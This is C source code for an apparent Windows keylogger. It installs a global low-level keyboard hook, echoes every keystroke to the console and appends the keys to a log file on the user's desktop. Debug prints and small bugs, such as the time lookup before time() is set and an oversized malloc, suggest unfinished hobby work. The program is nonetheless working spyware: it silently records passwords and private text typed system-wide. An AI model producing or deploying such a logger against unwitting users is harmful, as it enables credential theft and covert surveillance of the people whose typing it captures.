#include <stdio.h>
#include <windows.h>
#include <time.h>
// add this line or add user32.lib on Makefile
//#pragma comment(lib, "user32.lib")

/*
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD     vkCode;       A virtual-key code. The code must be a value in the range 1 to 254.
    DWORD     scanCode;     A hardware scan code for the key.
    DWORD     flags;        The extended-key flag, event-injected flags, context code, and transition-state flag.
    DWORD     time;         The time stamp for this message, equivalent to what GetMessageTime would return for this message.
    ULONG_PTR dwExtraInfo;  Additional information associated with the message.
} KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
*/

char    *GetMyLocalTime(void)
{
    time_t  t = 0;
    size_t  size = 0;
    struct  tm tm_info;
    char    *buffer = NULL;

    localtime_s(&tm_info, &t);
    t = time(NULL);
    size = strftime(NULL, 0, "[%d.%m.%Y %H:%M:%S]", &tm_info);
    printf("time = %zu\n", size);

    buffer = malloc(sizeof(char *) * size + 1);
    if (!buffer)
        return (NULL);

    strftime(buffer, size, "[%d.%m.%Y %H:%M:%S]", &tm_info);

    return (buffer);
}

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
    DWORD   kCode = 0;

    /*DWORD file = GetFileAttributes("C:\\Users\\r4mnesia\\Desktop\\log.txt");
    if (file != INVALID_FILE_ATTRIBUTES)
    {
        // openfile 
    }
    else
    {
        // create file 
    }*/



    if (wParam == WM_KEYDOWN)
    {
        switch(pkey->vkCode)
        {
            case VK_SPACE:
                kCode = pkey->vkCode;
                printf("[SPACE]");
                break ;
            case VK_RETURN:
                kCode = pkey->vkCode;
                printf("[ENTER]");
                break ;
            case VK_BACK:
                kCode = pkey->vkCode;
                printf("[BACKSPACE]");
                break ;
            default:
                kCode = pkey->vkCode;
                printf("%c", (char)pkey->vkCode);
                HANDLE  hFile = CreateFile(
                    "C:\\Users\\r4mnesia\\Desktop\\log.txt",
                    GENERIC_WRITE,
                    0,
                    NULL,
                    OPEN_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL
                );
            
                if (hFile == INVALID_HANDLE_VALUE) {
                    printf("CreateFile error: %lu\n", GetLastError());
                    // return NULL;
                }
                printf("bonjour");

                char *time = GetMyLocalTime();
                printf("bonjour");
                printf("%s\n", time);
                if (time)
                    free(time);
                SetFilePointer(hFile, 0, NULL, FILE_END);

                char    c = (char)pkey->vkCode;
                DWORD   written;

                WriteFile(hFile, &c, 1, &written, NULL);
                CloseHandle(hFile);
                break ;
        }
    }


    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main(void)
{
    HHOOK hhook = SetWindowsHookExA(
                            WH_KEYBOARD_LL,
                            hook_proc,
                            NULL,
                            0);

    if (!hhook)
        printf("Hook wasn't installed\n");
    printf("Hook was installed\n");

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}